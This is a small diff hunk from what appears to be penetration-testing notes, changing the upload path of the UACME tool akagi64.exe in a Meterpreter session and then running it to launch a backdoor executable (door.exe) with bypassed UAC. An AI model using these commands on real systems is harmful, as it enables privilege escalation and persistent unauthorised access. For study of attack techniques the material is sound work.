@@ -51,7 +51,7 @@ set LPOT 1234
 run
 
 #In other session upload evil-payload if meterpreter session
-upload /root/UACME/akagi64.exe
+upload /root/akagi64.exe
 
 # specifiet where is our payload
 ./akagi64.exe 23 C:\Temp\door.exe
